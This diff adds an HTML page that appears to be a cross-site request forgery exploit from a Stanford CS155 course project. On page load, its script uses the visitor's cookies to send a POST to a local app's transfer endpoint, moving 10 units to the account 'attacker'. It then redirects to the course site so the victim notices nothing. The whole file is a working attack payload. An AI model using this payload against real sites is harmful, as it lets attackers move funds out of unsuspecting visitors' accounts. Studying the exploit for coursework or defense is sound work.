@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<script>
+		// Tranfer to 'attacker'
+		const params = "destination_username=attacker&quantity=10";
+		const req = new XMLHttpRequest();
+		req.withCredentials=true;
+		req.onload = function() {
+			// 结束之后加载到一个正常页面
+			window.location = 'http://cs155.stanford.edu/';
+		}
+		req.onerror =function() {
+			window.location = 'http://cs155.stanford.edu/';
+		}
+		req.open('POST', 'http://localhost:3000/post_transfer');
+		req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+		req.send(params);
+		</script>
+	</head>
+	<body></body>
+</html>
